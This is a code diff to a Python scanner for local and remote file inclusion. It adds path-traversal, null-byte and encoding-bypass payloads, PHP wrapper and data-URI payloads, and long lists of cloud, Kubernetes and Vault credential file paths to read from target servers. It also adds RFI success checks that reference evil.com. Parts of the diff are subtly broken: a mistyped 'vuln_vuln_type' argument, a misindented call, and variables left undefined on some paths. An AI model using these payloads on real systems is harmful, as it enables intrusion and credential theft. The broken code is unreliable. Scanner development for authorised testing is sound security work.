@@ -24,11 +24,8 @@ from __future__ import annotations
 import asyncio
 import base64
 import binascii
-import hashlib
 import random
 import re
-import string
-import time
 from dataclasses import dataclass, field
 from enum import Enum, auto
 from typing import TYPE_CHECKING, Any, Optional
@@ -36,8 +33,12 @@ from urllib.parse import parse_qs, urlencode, urljoin, urlparse
 
 import httpx
 
-from scanning.vuln_scanner import Finding, ScanModule
+from scanning.findings import Finding, VulnType, VulnCategory, Severity
+from scanning.vuln_scanner import ScanModule
+from scanning.scan_context import ScanContext
 from utils.logger import get_logger
+from utils.scan_client import get_scan_client
+from utils.network_utils import resolve_base_url
 from utils.rate_limiter import RateLimiter
 from utils.scanner_helpers import WAFType as BaseWAFType, WAFDetector as BaseWAFDetector
 from utils.payload_encoder import PayloadEncoder as BasePayloadEncoder
@@ -251,6 +252,26 @@ class PayloadEncoder:
         for null_payload in cls.null_byte_variations(payload)[:3]:
             encodings.append((null_payload, "null_byte"))
 
+        # FN-M10 FIX: Additional encoding variations
+        # Triple URL encoding (for multi-layer WAF bypass)
+        triple_encoded = cls.url_encode(cls.url_encode(cls.url_encode(payload)))
+        encodings.append((triple_encoded, "triple_encoded"))
+
+        # Double-encoded null byte
+        if "%00" not in payload:
+            encodings.append((payload + "%2500", "double_null"))
+
+        # Backslash variations (Windows paths)
+        if "/" in payload:
+            backslash_payload = payload.replace("/", "\\")
+            encodings.append((backslash_payload, "backslash"))
+            encodings.append((backslash_payload.replace("\\", "%5c"), "encoded_backslash"))
+
+        # Path truncation attempts (long paths)
+        if "../" in payload:
+            long_path = "../" * 20 + payload.split("../")[-1]
+            encodings.append((long_path, "path_truncation"))
+
         return encodings
 
 
@@ -378,10 +399,44 @@ class PayloadGenerator:
         "/etc/mysql/my.cnf",
         "/etc/mysql/mysql.conf.d/mysqld.cnf",
         "/var/lib/mysql/mysql/user.MYD",
-        # AWS/Cloud
+        # AWS/Cloud (2026-02-12: Expanded cloud paths)
         "/home/user/.aws/credentials",
         "/root/.aws/credentials",
+        "/home/user/.aws/config",
+        "/root/.aws/config",
+        "/home/user/.aws/cli/cache/",
+        # GCP Service Account
+        "/home/user/.config/gcloud/credentials.db",
+        "/home/user/.config/gcloud/application_default_credentials.json",
+        "/root/.config/gcloud/application_default_credentials.json",
+        "/etc/google/auth/application_default_credentials.json",
+        # Azure
+        "/home/user/.azure/accessTokens.json",
+        "/home/user/.azure/azureProfile.json",
+        "/root/.azure/accessTokens.json",
+        "/root/.azure/azureProfile.json",
+        # Kubernetes (expanded)
         "/var/run/secrets/kubernetes.io/serviceaccount/token",
+        "/var/run/secrets/kubernetes.io/serviceaccount/ca.crt",
+        "/var/run/secrets/kubernetes.io/serviceaccount/namespace",
+        "/etc/kubernetes/admin.conf",
+        "/etc/kubernetes/kubelet.conf",
+        "/etc/kubernetes/controller-manager.conf",
+        "/etc/kubernetes/scheduler.conf",
+        "/root/.kube/config",
+        "/home/user/.kube/config",
+        # Cloud-init
+        "/var/lib/cloud/instance/user-data.txt",
+        "/var/lib/cloud/instance/scripts/runcmd",
+        "/var/lib/cloud/data/instance-id",
+        "/run/cloud-init/instance-data.json",
+        # Terraform/Infrastructure
+        "/root/.terraform.d/credentials.tfrc.json",
+        "/home/user/.terraform.d/credentials.tfrc.json",
+        # Vault/Consul
+        "/etc/vault.d/config.hcl",
+        "/root/.vault-token",
+        "/etc/consul.d/config.json",
         # Docker
         "/.dockerenv",
         "/proc/1/cgroup",
@@ -420,6 +475,17 @@ class PayloadGenerator:
         # Application configs
         "C:\\inetpub\\wwwroot\\config.php",
         "C:\\inetpub\\wwwroot\\wp-config.php",
+        # Cloud credentials (2026-02-12)
+        "C:\\Users\\Administrator\\.aws\\credentials",
+        "C:\\Users\\Administrator\\.aws\\config",
+        "C:\\Users\\Administrator\\.azure\\accessTokens.json",
+        "C:\\Users\\Administrator\\.azure\\azureProfile.json",
+        "C:\\Users\\Administrator\\.kube\\config",
+        "C:\\Users\\Administrator\\.config\\gcloud\\application_default_credentials.json",
+        "C:\\Users\\Administrator\\.terraform.d\\credentials.tfrc.json",
+        # Azure Instance Metadata Service cache (Windows)
+        "C:\\WindowsAzure\\Logs\\Plugins\\",
+        "C:\\WindowsAzure\\Config\\",
     ]
     
     # PHP wrappers payloads
@@ -480,8 +546,104 @@ class PayloadGenerator:
         PHPWrapper.BZIP2: [
             "compress.bzip2:///etc/passwd",
         ],
+        # 2026-02-16: Added missing wrappers for comprehensive PHP LFI testing
+        PHPWrapper.GLOB: [
+            # Glob pattern to enumerate files
+            "glob:///etc/passwd*",
+            "glob:///var/www/*",
+            "glob:///var/www/html/*.php",
+            "glob:///tmp/*",
+            "glob://./*.php",
+            "glob://../*",
+        ],
+        PHPWrapper.FTP: [
+            # FTP wrapper for RFI (requires allow_url_include)
+            "ftp://anonymous@localhost/",
+            "ftp://anonymous:anonymous@localhost/pub/",
+        ],
+        PHPWrapper.HTTP: [
+            # HTTP wrapper for RFI (requires allow_url_include)
+            "http://localhost/",
+            "http://127.0.0.1/",
+        ],
+        PHPWrapper.HTTPS: [
+            # HTTPS wrapper for RFI
+            "https://localhost/",
+        ],
     }
-    
+
+    # ==========================================================================
+    # PHP LEGACY LFI PAYLOADS (2026-02-16)
+    # For DVWA, bWAPP, Mutillidae and legacy PHP applications
+    # ==========================================================================
+
+    PHP_LEGACY_LFI_PAYLOADS = [
+        # Classic path traversal (most common in PHP)
+        "../../../etc/passwd",
+        "../../../../etc/passwd",
+        "../../../../../etc/passwd",
+        "../../../../../../etc/passwd",
+        "../../../../../../../etc/passwd",
+
+        # Null byte injection (PHP < 5.3.4)
+        "../../../etc/passwd%00",
+        "../../../etc/passwd%00.php",
+        "../../../etc/passwd%00.html",
+        "../../../etc/passwd\x00",
+
+        # Double encoding (common bypass)
+        "..%252f..%252f..%252fetc%252fpasswd",
+        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+        "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
+
+        # Path normalization bypass
+        "....//....//....//etc/passwd",
+        "..../..../..../etc/passwd",
+        "....\\....\\....\\etc\\passwd",
+
+        # Mixed encoding
+        "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
+        "..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd",
+
+        # Windows paths
+        "..\\..\\..\\..\\windows\\win.ini",
+        "..\\..\\..\\..\\boot.ini",
+        "C:\\windows\\win.ini",
+        "C:\\boot.ini",
+
+        # PHP source disclosure
+        "php://filter/convert.base64-encode/resource=index.php",
+        "php://filter/convert.base64-encode/resource=config.php",
+        "php://filter/convert.base64-encode/resource=../config.php",
+        "php://filter/read=convert.base64-encode/resource=../includes/database.php",
+
+        # Symlink following via /proc
+        "/proc/self/root/../../../etc/passwd",
+        "/proc/self/cwd/../../../etc/passwd",
+        "/proc/self/environ",
+        "/proc/self/cmdline",
+
+        # Apache/Nginx log files (for log poisoning)
+        "/var/log/apache2/access.log",
+        "/var/log/apache2/error.log",
+        "/var/log/nginx/access.log",
+        "/var/log/nginx/error.log",
+        "/var/log/httpd/access_log",
+
+        # PHP session files
+        "/var/lib/php/sessions/sess_",
+        "/tmp/sess_",
+
+        # Common sensitive files
+        "/etc/shadow",
+        "/etc/hosts",
+        "../.env",
+        "../../.env",
+        "../../../.env",
+        "../.git/config",
+        "../../.git/config",
+    ]
+
     # Log files for poisoning
     LOG_FILES = {
         "apache": [
@@ -598,7 +760,21 @@ class PayloadGenerator:
         for var in variations:
             base = var * min(depth, 5)
             payloads.append((f"{base}{target_file.lstrip('/')}", f"Bypass: {var}"))
-        
+
+        # Null byte variations (bypass extension filters like .php/.txt appended)
+        null_bytes = [
+            "%00",           # URL-encoded null
+            "%00.php",       # Null + fake extension
+            "%00.html",      # Null + fake extension
+            "%00.txt",       # Null + fake extension
+            "%2500",         # Double-encoded null
+            "\x00",          # Raw null byte
+        ]
+        for i in [3, 5, 8]:
+            base = "../" * i
+            for nb in null_bytes:
+                payloads.append((f"{base}{target_file.lstrip('/')}{nb}", f"Null byte bypass depth {i}"))
+
         return payloads
     
     @classmethod
@@ -896,7 +1072,7 @@ class ResponseAnalyzer:
         return LFIResult(
             vulnerable=confidence >= 40,
             lfi_type=lfi_type,
-            confidence=confidence,
+            confidence_score=confidence,
             payload=payload,
             evidence=evidence,
             file_content=file_content or (content[:500] if confidence >= 60 else None),
@@ -923,14 +1099,47 @@ class LFIScanner(ScanModule):
     name = "lfi_scanner"
     version = LFI_SCANNER_VERSION
     
-    def __init__(self, settings: Settings) -> None:
-        super().__init__(settings)
-        self.timeout = settings.timeouts.request_timeout
+    def __init__(
+        self,
+        settings: Settings,
+        *,
+        findings_store: Any = None,
+        rate_limiter: Any = None,
+    ) -> None:
+        super().__init__(settings, findings_store=findings_store, rate_limiter=rate_limiter)
+        self.timeout = settings.timeouts.request_timeout if hasattr(settings, 'timeouts') else 30.0
         self.findings: list[dict[str, Any]] = []
         self.detected_waf: Optional[WAFType] = None
         self.tested_payloads: set[str] = set()
         self.baseline_responses: dict[str, str] = {}
         self.detected_os: Optional[TargetOS] = None
+        # Load configurable limits
+        self._limits = self._load_limits()
+
+        # THEME-1 FIX: Configurable payload testing depth (prevent premature abandonment)
+        # FN-FIX 2026-02-08: Increased all limits to reduce false negatives
+        self.max_traversal_payloads = 50  # FN-FIX: Was 20 - deep paths need 50+
+        self.max_findings_per_param = 10  # FN-FIX: Was 3 - capture multiple files
+        self.max_wrapper_payloads = 25    # FN-FIX: Was 12 - test all major wrappers
+        self.max_form_payloads = 15       # FN-FIX: Was 8 - test more form payloads
+
+    def _load_limits(self) -> dict:
+        """Load LFI scanner limits from config."""
+        try:
+            from core.config_manager import get_scanner_limits
+            limits = get_scanner_limits()
+            return {
+                "max_traversal_depth": limits.lfi.max_traversal_depth,
+                "max_wrapper_tests": limits.lfi.max_wrapper_tests,
+                "max_encoding_variations": limits.lfi.max_encoding_variations,
+            }
+        except Exception:
+            # Fallback defaults
+            return {
+                "max_traversal_depth": 10,
+                "max_wrapper_tests": 8,
+                "max_encoding_variations": 6,
+            }
     
     async def scan(
         self,
@@ -941,18 +1150,106 @@ class LFIScanner(ScanModule):
         """Execute comprehensive LFI/RFI scan."""
         self.findings = []
         self.tested_payloads = set()
-        
-        base_url = f"https://{host}" if not host.startswith("http") else host
-        urls = asset_data.get("urls", [])
-        forms = asset_data.get("forms", [])
-        
+
+        base_url = resolve_base_url(host)
+        # GAP-A1 FIX 2026-02-18: Use "endpoints" key (what full_scanner provides)
+        # Bug: Was using "urls" which is always empty!
+        if isinstance(asset_data, dict):
+            urls = asset_data.get("endpoints", []) or asset_data.get("urls", [])
+        if isinstance(asset_data, dict):
+            forms = asset_data.get("forms", [])
+
+        # SCAN CONTEXT: Unified access to auth, response validation, training app awareness
+        self._ctx = ScanContext(asset_data)
+        self._ctx.log_context_status()
+        self._auth_headers = self._ctx.auth_headers
+
+        # PERF-FIX 2026-02-20: Store asset_data for intelligent payload selection
+        self._asset_data = asset_data
+
+        # SHARED FINDINGS STORE: Cross-module targeting
+        if isinstance(asset_data, dict):
+            shared_store = asset_data.get("shared_findings_store")
+        if shared_store:
+            from utils.shared_findings_store import VulnType
+            existing_urls = {u.split("?")[0] if "?" in u else u for u in urls}
+            # LFI often works where other file-related vulns work
+            for vtype in [VulnType.SSRF, VulnType.XXE, VulnType.COMMAND_INJECTION]:
+                for sf in shared_store.get_findings_by_type(vtype):
+                    if sf.endpoint and sf.endpoint not in existing_urls:
+                        urls.append(sf.endpoint)
+                        logger.debug(f"[LFI] Cross-module target from {sf.module}: {sf.endpoint}")
+
+        # TOOL_DISCOVERED_PARAMS: Add Arjun-discovered params to endpoints
+        if isinstance(asset_data, dict):
+            tool_params = asset_data.get("tool_discovered_params") or {}
+        if tool_params:
+            lfi_params = ["file", "path", "page", "include", "doc", "folder", "root",
+                          "lang", "template", "filename", "document", "dir"]
+            new_urls = []
+            for url in urls:
+                parsed = urlparse(url)
+                if parsed.netloc in tool_params:
+                    for param in tool_params[parsed.netloc]:
+                        # Prioritize params that sound like file inclusion
+                        if any(lfi_word in param.lower() for lfi_word in lfi_params):
+                            test_url = f"{url}{'&' if '?' in url else '?'}{param}=test"
+                            if test_url not in urls:
+                                new_urls.append(test_url)
+                                logger.debug(f"[LFI] Adding Arjun param: {param}")
+            urls.extend(new_urls[:20])  # Limit expansion
+
+        # ENHANCEMENT 2026-02-20: Get endpoint_params and vuln_type_hints from metadata discovery
+        # This enables testing of endpoints discovered from /scanner, /api-docs, etc.
+        endpoint_params: dict[str, list[str]] = {}
+        vuln_type_hints: dict[str, list[str]] = {}
+        if isinstance(asset_data, dict):
+            endpoint_params = asset_data.get("endpoint_params", {})
+            vuln_type_hints = asset_data.get("vuln_type_hints", {})
+        if endpoint_params:
+            logger.info(f"[LFI] Received {len(endpoint_params)} endpoints with params from metadata discovery")
+
+        # Add metadata-discovered endpoints with PATH_TRAVERSAL hints to url list
+        lfi_hint_types = {"PATH_TRAVERSAL", "LFI", "LOCAL_FILE_INCLUSION", "FILE_INCLUSION", "DIRECTORY_TRAVERSAL"}
+        for ep_url, hints in vuln_type_hints.items():
+            if not any(h in lfi_hint_types for h in hints):
+                continue
+            # Normalize URL
+            if ep_url.startswith("/"):
+                full_url = f"{base_url}{ep_url}"
+            elif not ep_url.startswith("http"):
+                full_url = f"{base_url}/{ep_url}"
+            else:
+                full_url = ep_url
+            # Add with parameters
+            params = endpoint_params.get(ep_url, ["file", "path", "page", "include"])
+            for param in params[:3]:  # Limit to 3 params
+                test_url = f"{full_url}?{param}=test" if "?" not in full_url else f"{full_url}&{param}=test"
+                if test_url not in urls:
+                    urls.append(test_url)
+                    logger.debug(f"[LFI] Adding metadata endpoint: {test_url}")
+        if vuln_type_hints:
+            lfi_hinted = sum(1 for hints in vuln_type_hints.values() if any(h in lfi_hint_types for h in hints))
+            if lfi_hinted > 0:
+                logger.info(f"[LFI] Added {lfi_hinted} endpoints with PATH_TRAVERSAL/LFI hints")
+
+        # GAP-4 FIX 2026-02-18: Generate parameterized URLs for known LFI-vulnerable paths
+        # Problem: Discovery often finds /vulnerabilities/fi/ but not /vulnerabilities/fi/?page=file1.php
+        # Solution: Generate fallback parameterized variants for known LFI patterns
+        if not any('?' in u for u in urls):
+            parameterized = self._generate_parameterized_endpoints(urls, base_url)
+            if parameterized:
+                urls.extend(parameterized)
+                logger.info(f"[LFI] Generated {len(parameterized)} parameterized endpoint fallbacks")
+
         logger.info(f"🎯 LFI/RFI Scanner v{self.version} starting on {host}")
-        
-        async with httpx.AsyncClient(
+        if self._ctx.has_auth:
+            logger.info(f"[LFI] Using authenticated session ({self._ctx.auth_method})")
+
+        async with get_scan_client(
             timeout=self.timeout,
-            verify=False,
             follow_redirects=True,
-            limits=httpx.Limits(max_connections=10)
+            custom_headers=self._auth_headers,
         ) as client:
             
             # Phase 1: WAF Detection
@@ -986,9 +1283,42 @@ class LFIScanner(ScanModule):
             
             # Phase 10: Encoding Bypass Tests
             await self._test_encoding_bypass(client, base_url, urls, rate_limiter)
-        
-        logger.info(f"✅ LFI/RFI scan completed. Found {len(self.findings)} vulnerabilities")
-        
+
+            # Phase 11: PHP Legacy LFI Testing (2026-02-16)
+            # Specifically for DVWA, bWAPP, Mutillidae and legacy PHP apps
+            await self._test_php_legacy_lfi(client, base_url, urls, rate_limiter)
+
+        logger.info(f"[LFI] Scan completed. Found {len(self.findings)} vulnerabilities")
+
+        # CROSS-MODULE SHARING: Add findings to SharedFindingsStore
+        try:
+            from utils.shared_findings_store import SharedFindingsStore, VulnType
+            store = SharedFindingsStore.get_instance()
+
+            for f in self.findings:
+                if isinstance(f, dict):
+                    metadata = f.get("metadata", {})
+
+                    # Construir o dict de forma segura
+                    finding_data = {
+                        "type": VulnType.PATH_TRAVERSAL,
+                        "severity": f.get("severity", "HIGH"),
+                    }
+
+                    if isinstance(f, dict):
+                        finding_data["endpoint"] = f.get("matched_at") or metadata.get("url", "")
+                        finding_data["parameter"] = metadata.get("param") or metadata.get("vulnerable_param", "")
+                        finding_data["file_disclosed"] = metadata.get("file_disclosed", "")
+
+                    await store.add_finding(finding_data, module="lfi")
+
+            if self.findings:
+                logger.debug(f"[LFI] Shared {len(self.findings)} findings to cross-module store")
+
+        except Exception as e:
+            logger.debug(f"[LFI] Could not share findings: {e}")
+
+
         return {
             "module": self.name,
             "version": self.version,
@@ -1025,26 +1355,110 @@ class LFIScanner(ScanModule):
             await rate_limiter.acquire()
             try:
                 response = await client.get(url)
+
+                # RESPONSE VALIDATION: Skip login pages, SPA fallbacks
+                if hasattr(self, "_ctx") and not self._ctx.is_meaningful_response(
+                    response.text,
+                    response.status_code,
+                    response.headers.get("content-type", ""),
+                    url,
+                ):
+                    logger.debug(f"[LFI] Skipping baseline {url} - login/SPA/error page")
+                    continue
+
                 self.baseline_responses[url] = response.text
             except Exception:
                 pass
     
+    def _generate_parameterized_endpoints(self, urls: list[str], base_url: str) -> list[str]:
+        """
+        Generate parameterized URLs for known LFI-vulnerable paths.
+
+        GAP-4 FIX 2026-02-18: When discovery only finds base paths like /vulnerabilities/fi/,
+        this generates the parameterized variants like /vulnerabilities/fi/?page=file1.php.
+
+        See auditdocs/MASSIVE_GAP_AUDIT_2026-02-18.md for details.
+        """
+        generated = []
+        seen = set()
+
+        # Known LFI-vulnerable path patterns and their default parameters
+        LFI_PATH_PATTERNS = {
+            # DVWA
+            "/fi/": [("page", "file1.php"), ("page", "include.php")],
+            "/vulnerabilities/fi/": [("page", "file1.php"), ("page", "include.php")],
+            # bWAPP
+            "/bWAPP/rlfi.php": [("language", "lang_en.php")],
+            "/bWAPP/directory_traversal_1.php": [("page", "message.txt")],
+            "/bWAPP/directory_traversal_2.php": [("directory", "documents")],
+            # Mutillidae
+            "/index.php": [("page", "home.php"), ("page", "login.php")],
+            "/mutillidae/index.php": [("page", "home.php")],
+            # Generic
+            "/include.php": [("file", "header.php"), ("page", "index.php")],
+            "/load.php": [("file", "content.txt")],
+            "/view.php": [("file", "readme.txt"), ("doc", "help.txt")],
+            "/page.php": [("p", "home"), ("page", "main.php")],
+            "/read.php": [("file", "data.txt")],
+            "/download.php": [("file", "document.pdf")],
+        }
+
+        for url in urls:
+            parsed = urlparse(url)
+            path = parsed.path.lower()
+
+            # Check if URL matches any known LFI pattern
+            for pattern, params in LFI_PATH_PATTERNS.items():
+                if pattern in path or path.endswith(pattern.rstrip('/')):
+                    for param_name, default_value in params:
+                        # Build parameterized URL
+                        param_url = f"{url.rstrip('/')}?{param_name}={default_value}"
+                        if param_url not in seen:
+                            seen.add(param_url)
+                            generated.append(param_url)
+
+        # Also try common LFI params on any PHP/ASP files
+        for url in urls:
+            if any(ext in url.lower() for ext in ['.php', '.asp', '.aspx', '.jsp']):
+                for param in ['file', 'page', 'include', 'path', 'doc', 'template']:
+                    param_url = f"{url}{'&' if '?' in url else '?'}{param}=test.txt"
+                    if param_url not in seen:
+                        seen.add(param_url)
+                        generated.append(param_url)
+
+        # Generate parameterized URLs for base_url known paths (training app detection)
+        base_parsed = urlparse(base_url)
+        if any(app in base_parsed.netloc.lower() or app in base_url.lower()
+               for app in ['localhost', '127.0.0.1', 'dvwa', 'bwapp', 'mutillidae']):
+            # This looks like a training app - add common LFI endpoints
+            training_endpoints = [
+                f"{base_url.rstrip('/')}/vulnerabilities/fi/?page=file1.php",
+                f"{base_url.rstrip('/')}/vulnerabilities/fi/?page=include.php",
+                f"{base_url.rstrip('/')}/index.php?page=home.php",
+            ]
+            for ep in training_endpoints:
+                if ep not in seen:
+                    seen.add(ep)
+                    generated.append(ep)
+
+        return list(generated)
+
     def _find_vulnerable_params(self, urls: list[str]) -> list[tuple[str, str, dict]]:
         """Find parameters likely vulnerable to LFI."""
         vulnerable = []
         seen = set()
-        
+
         for url in urls:
             parsed = urlparse(url)
             params = parse_qs(parsed.query)
-            
+
             for param_name in params:
                 if param_name.lower() in PayloadGenerator.LFI_PARAMS:
                     key = f"{parsed.path}:{param_name}"
                     if key not in seen:
                         seen.add(key)
                         vulnerable.append((url, param_name, parsed))
-        
+
         return vulnerable
     
     async def _test_path_traversal(
@@ -1067,42 +1481,87 @@ class LFIScanner(ScanModule):
         
         for url, param_name, parsed in vulnerable_params[:20]:
             baseline = self.baseline_responses.get(url, "")
-            
+            param_findings_count = 0  # THEME-1 FIX: Track findings per param
+
             for target_file in target_files:
-                payloads = PayloadGenerator.generate_traversal_payloads(target_file, depth=10)
-                
-                for payload, description in payloads[:10]:
+                # Use configurable traversal depth from scanner_limits.lfi
+                depth = self._limits.get("max_traversal_depth", 10)
+                payloads = PayloadGenerator.generate_traversal_payloads(target_file, depth=depth)
+
+                # PERF-FIX 2026-02-20: Try intelligent payload selection
+                intelligent_payloads = await self._get_intelligent_payloads(
+                    category="lfi",
+                    endpoint=url,
+                    param_name=param_name,
+                    max_payloads=30,
+                    asset_data=getattr(self, '_asset_data', None),
+                )
+                if intelligent_payloads:
+                    # Use intelligent payloads first, then fallback to generated payloads
+                    intelligent_list = [(p[0], f"intelligent: {p[1]}") for p in intelligent_payloads]
+                    payloads = intelligent_list + payloads[:20]
+
+                # THEME-1 FIX: Test more traversal payloads for thorough coverage
+                for payload, description in payloads[:self.max_traversal_payloads]:
+                    # THEME-1 FIX: Continue after findings but cap at max per param
+                    if param_findings_count >= self.max_findings_per_param:
+                        break
+
                     await rate_limiter.acquire()
-                    
+
                     params = parse_qs(parsed.query)
                     params[param_name] = [payload]
                     query = urlencode(params, doseq=True)
-                    
+
                     test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{query}"
-                    
+
                     if test_url in self.tested_payloads:
                         continue
                     self.tested_payloads.add(test_url)
-                    
+
                     try:
                         response = await client.get(test_url)
                         result = ResponseAnalyzer.analyze(response, payload, baseline)
-                        
+
                         if result.vulnerable:
+                            # GAP-2 FIX 2026-02-13: Negative control check
+                            # Verify file content indicator doesn't appear with benign input
+                            indicator = None
+                            if result.file_content:
+                                # Use first line of file content as indicator
+                                indicator = result.file_content.split('\n')[0][:50] if '\n' in result.file_content else result.file_content[:50]
+                            elif result.evidence:
+                                # Use first evidence line as indicator
+                                indicator = str(result.evidence[0])[:50] if result.evidence else None
+
+                            if indicator:
+                                is_valid = await self.quick_negative_control(
+                                    http_client=client,
+                                    url=base_url,
+                                    param=param_name,
+                                    indicator=indicator,
+                                    vuln_vuln_type=VulnType.LFI,
+                        category=VulnCategory.SERVER_SIDE,
+                                )
+                                if not is_valid:
+                                    logger.debug(f"[LFI] Negative control failed for {param_name}: indicator appears with benign input")
+                                    continue  # Skip this FP
+
                             if result.target_os:
                                 self.detected_os = result.target_os
-                            
+
                             self._add_finding(
                                 name="Local File Inclusion (Path Traversal)",
                                 description=f"Path traversal vulnerability in parameter '{param_name}'. {description}",
-                                severity="HIGH" if not result.source_disclosed else "CRITICAL",
+                                severity=Severity.HIGH if not result.source_disclosed else "CRITICAL",
                                 host=base_url,
                                 endpoint=test_url,
                                 result=result,
                                 param=param_name,
                             )
-                            break  # Found LFI, stop testing this file
-                            
+                            param_findings_count += 1
+                            # THEME-1 FIX: Continue to find more files/traversal patterns
+
                     except Exception as e:
                         logger.debug(f"Path traversal test error: {e}")
     
@@ -1123,20 +1582,25 @@ class LFIScanner(ScanModule):
         
         for url, param_name, parsed in vulnerable_params[:15]:
             baseline = self.baseline_responses.get(url, "")
-            
+            wrapper_findings_count = 0  # THEME-1 FIX: Track findings per param
+
             for payload, description, wrapper in wrapper_payloads[:20]:
+                # THEME-1 FIX: Continue after findings but cap at max per param
+                if wrapper_findings_count >= self.max_findings_per_param:
+                    break
+
                 await rate_limiter.acquire()
-                
+
                 params = parse_qs(parsed.query)
                 params[param_name] = [payload]
                 query = urlencode(params, doseq=True)
-                
+
                 test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{query}"
-                
+
                 if test_url in self.tested_payloads:
                     continue
                 self.tested_payloads.add(test_url)
-                
+
                 try:
                     # Special handling for php://input
                     if wrapper == PHPWrapper.INPUT:
@@ -1146,12 +1610,12 @@ class LFIScanner(ScanModule):
                         )
                     else:
                         response = await client.get(test_url)
-                    
+
                     result = ResponseAnalyzer.analyze(response, payload, baseline)
-                    
+
                     if result.vulnerable:
                         severity = "CRITICAL" if result.rce_possible else "HIGH"
-                        
+
                         self._add_finding(
                             name=f"PHP Wrapper Exploitation ({description})",
                             description=f"PHP wrapper '{wrapper.value}' is exploitable via parameter '{param_name}'.",
@@ -1161,8 +1625,9 @@ class LFIScanner(ScanModule):
                             result=result,
                             param=param_name,
                         )
-                        break
-                        
+                        wrapper_findings_count += 1
+                        # THEME-1 FIX: Continue to find more wrappers/files
+
                 except Exception as e:
                     logger.debug(f"PHP wrapper test error: {e}")
     
@@ -1189,19 +1654,31 @@ class LFIScanner(ScanModule):
                 continue
             
             form_url = urljoin(base_url, action) if action else base_url
-            
+
+            # THEME-1 FIX: Expanded form LFI payloads for thorough coverage
             payloads = [
                 ("../../../etc/passwd", "Basic traversal"),
                 ("....//....//....//etc/passwd", "Filter bypass"),
                 ("php://filter/convert.base64-encode/resource=/etc/passwd", "PHP filter"),
+                ("..%2F..%2F..%2Fetc%2Fpasswd", "URL encoded traversal"),
+                ("..\\..\\..\\etc\\passwd", "Backslash traversal"),
+                ("/etc/passwd%00.jpg", "Null byte extension bypass"),
+                ("php://input", "PHP input stream"),
+                ("data://text/plain;base64,PD9waHAgZWNobyAnTEZJX1RFU1QnOyA/Pg==", "Data URI"),
             ]
-            
-            for file_input in file_inputs[:3]:
+
+            for file_input in file_inputs[:5]:  # Was [:3]
                 input_name = file_input.get("name", "")
-                
-                for payload, description in payloads:
+                form_findings_count = 0  # THEME-1 FIX: Track findings per input
+
+                # THEME-1 FIX: Test more payloads for thorough coverage
+                for payload, description in payloads[:self.max_form_payloads]:
+                    # THEME-1 FIX: Continue after findings but cap at max per input
+                    if form_findings_count >= self.max_findings_per_param:
+                        break
+
                     await rate_limiter.acquire()
-                    
+
                     form_data = {}
                     for inp in inputs:
                         name = inp.get("name", "")
@@ -1210,27 +1687,28 @@ class LFIScanner(ScanModule):
                                 form_data[name] = payload
                             else:
                                 form_data[name] = inp.get("value", "test")
-                    
+
                     try:
                         if method == "POST":
                             response = await client.post(form_url, data=form_data)
                         else:
                             response = await client.get(form_url, params=form_data)
-                        
+
                         result = ResponseAnalyzer.analyze(response, payload)
-                        
+
                         if result.vulnerable:
                             self._add_finding(
                                 name="LFI in Form Parameter",
                                 description=f"Form input '{input_name}' vulnerable to LFI. {description}",
-                                severity="HIGH",
+                                severity=Severity.HIGH,
                                 host=base_url,
                                 endpoint=form_url,
                                 result=result,
                                 param=input_name,
                             )
-                            break
-                            
+                            form_findings_count += 1
+                            # THEME-1 FIX: Continue to find more LFI patterns
+
                     except Exception as e:
                         logger.debug(f"Form LFI test error: {e}")
     
@@ -1269,33 +1747,77 @@ class LFIScanner(ScanModule):
                 try:
                     response = await client.get(test_url)
                     content = response.text.lower()
-                    
-                    # RFI indicators
-                    rfi_indicators = [
-                        "allow_url_include",
-                        "allow_url_fopen",
+
+                    # Check if response differs from baseline (avoid FP on generic error pages)
+                    if baseline and len(content) > 100 and abs(len(content) - len(baseline)) < 50:
+                        # Response too similar to baseline, likely generic error page
+                        continue
+
+                    # SUCCESS indicators (actual RFI worked - CRITICAL)
+                    success_indicators = [
+                        "evil.com",              # Content from our payload URL reflected
+                        "shell.txt",             # Filename reflected in included content
+                    ]
+
+                    # ATTEMPT indicators (server tried to fetch - HIGH, not CRITICAL)
+                    attempt_indicators = [
                         "failed to open stream: http",
                         "failed to open stream: https",
                         "couldn't open remote file",
                         "http request failed",
-                        "wrapper is disabled",
+                        "getaddrinfo failed",    # DNS lookup for evil.com
+                        "connection refused",    # Tried to connect
                     ]
-                    
-                    found_indicators = [i for i in rfi_indicators if i in content]
-                    
-                    if found_indicators:
+
+                    # BLOCKED indicators (config prevents RFI - INFO only)
+                    blocked_indicators = [
+                        "wrapper is disabled",
+                        "allow_url_include = off",
+                        "allow_url_fopen = off",
+                        "url file-access is disabled",
+                    ]
+
+                    found_success = [i for i in success_indicators if i in content]
+                    found_attempt = [i for i in attempt_indicators if i in content]
+                    found_blocked = [i for i in blocked_indicators if i in content]
+
+                    # If explicitly blocked, skip (not vulnerable)
+                    if found_blocked and not found_success:
+                        continue
+
+                    if found_success:
+                        # Actual RFI success - CRITICAL
                         self._add_finding(
                             name=f"Remote File Inclusion ({description})",
-                            description=f"Parameter '{param_name}' may be vulnerable to RFI. Server attempted to fetch remote content.",
-                            severity="CRITICAL",
+                            description=f"Parameter '{param_name}' is vulnerable to RFI. Remote content was successfully included.",
+                            severity=Severity.CRITICAL,
                             host=base_url,
                             endpoint=test_url,
                             result=LFIResult(
                                 vulnerable=True,
                                 lfi_type=LFIType.RFI,
-                                confidence=70,
+                                confidence_score=90.0,
                                 payload=payload,
-                                evidence=[f"RFI indicator: {i}" for i in found_indicators],
+                                evidence=[f"RFI success: {i}" for i in found_success],
+                                rce_possible=True,
+                            ),
+                            param=param_name,
+                        )
+                        break
+                    elif found_attempt:
+                        # Server attempted RFI but failed (network/DNS) - still HIGH (would work with reachable host)
+                        self._add_finding(
+                            name=f"Remote File Inclusion Attempt ({description})",
+                            description=f"Parameter '{param_name}' may be vulnerable to RFI. Server attempted to fetch remote content but failed (likely unreachable host).",
+                            severity=Severity.HIGH,
+                            host=base_url,
+                            endpoint=test_url,
+                            result=LFIResult(
+                                vulnerable=True,
+                                lfi_type=LFIType.RFI,
+                                confidence_score=70.0,
+                                payload=payload,
+                                evidence=[f"RFI attempt: {i}" for i in found_attempt],
                                 rce_possible=True,
                             ),
                             param=param_name,
